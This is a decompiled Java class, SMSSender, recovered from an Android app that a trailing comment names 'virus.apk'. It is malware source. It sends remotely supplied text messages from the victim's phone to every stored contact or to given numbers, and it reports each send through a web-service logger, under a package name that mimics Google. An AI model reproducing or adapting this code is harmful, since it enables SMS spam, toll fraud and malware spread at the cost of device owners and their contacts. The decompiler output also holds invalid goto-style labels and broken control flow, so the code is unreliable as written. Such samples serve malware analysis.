package com.example.google.service;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Message;
import android.telephony.SmsManager;
import java.util.ArrayList;
import java.util.Iterator;

@SuppressLint({"HandlerLeak"})
public class SMSSender
{
  private WebServiceCalling caller;
  private Context mContext;

  public SMSSender(Context paramContext)
  {
    this.mContext = paramContext;
    this.caller = new WebServiceCalling(paramContext);
  }

  private void SendToContacts(Message paramMessage)
  {
    String str1 = (String)paramMessage.obj;
    String str2;
    SmsManager localSmsManager;
    Iterator localIterator1;
    if ((str1 != null) && (str1.length() > 0))
    {
      str2 = Tools.getPhoneNumber(this.mContext);
      localSmsManager = SmsManager.getDefault();
      localIterator1 = new ContactsHelper(this.mContext).GetAllContacts().iterator();
    }
    String str4;
    do
    {
      String str3;
      do
      {
        if (!localIterator1.hasNext())
          return;
        str3 = (String)localIterator1.next();
      }
      while (str3.split(":").length <= 1);
      str4 = str3.split(":")[1];
    }
    while (str4.length() <= 0);
    while (true)
    {
      int j;
      try
      {
        String[] arrayOfString = str1.split("\\}");
        int i = arrayOfString.length;
        j = 0;
        if (j >= i)
          break;
        String str5 = arrayOfString[j];
        if (str5.length() <= 0)
          break label289;
        Iterator localIterator2 = localSmsManager.divideMessage(str5).iterator();
        if (!localIterator2.hasNext())
          break label289;
        String str6 = (String)localIterator2.next();
        if (str6.length() <= 0)
          continue;
        localSmsManager.sendTextMessage(str4.trim(), null, str6, null, null);
        this.caller.Log("SMS", "S", str2, str4 + "|" + str6);
        continue;
      }
      catch (Exception localException)
      {
        this.caller.Log("SMS", "E", str2, str4 + "|" + str1);
        localException.printStackTrace();
      }
      break;
      label289: j++;
    }
  }

  void SendSMS(Message paramMessage)
  {
    String str1 = Tools.getPhoneNumber(this.mContext);
    String str2 = (String)paramMessage.obj;
    SmsManager localSmsManager;
    String[] arrayOfString1;
    int i;
    if ((str2 != null) && (str2.length() > 0))
    {
      localSmsManager = SmsManager.getDefault();
      arrayOfString1 = str2.split("\\}");
      i = arrayOfString1.length;
    }
    String str5;
    String[] arrayOfString2;
    int m;
    for (int j = 0; ; j++)
    {
      if (j >= i)
        return;
      String str3 = arrayOfString1[j];
      if (str3.split("\\|").length == 2)
      {
        String str4 = str3.split("\\|")[0];
        str5 = str3.split("\\|")[1];
        arrayOfString2 = str4.split("\\,");
        int k = arrayOfString2.length;
        m = 0;
        if (m < k)
          break;
      }
    }
    String str6 = arrayOfString2[m];
    String str7;
    if (str6.length() > 0)
    {
      str7 = "";
      if (str6.indexOf(":") <= -1)
        break label368;
      str7 = str6.split(":")[0] + ",";
    }
    label368: for (String str8 = str6.split(":")[1]; ; str8 = str6)
    {
      try
      {
        Iterator localIterator = localSmsManager.divideMessage(str7 + str5).iterator();
        while (localIterator.hasNext())
        {
          String str9 = (String)localIterator.next();
          if ((str9.length() > 0) && (str8.length() > 0))
          {
            localSmsManager.sendTextMessage(str8.trim(), null, str9, null, null);
            this.caller.Log("SMS", "S", str1, str8 + "|" + str9);
          }
        }
      }
      catch (Exception localException)
      {
        this.caller.Log("SMS", "E", str1, str8 + "|" + str5);
      }
      m++;
      break;
    }
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.SMSSender
 * JD-Core Version:    0.6.2
 */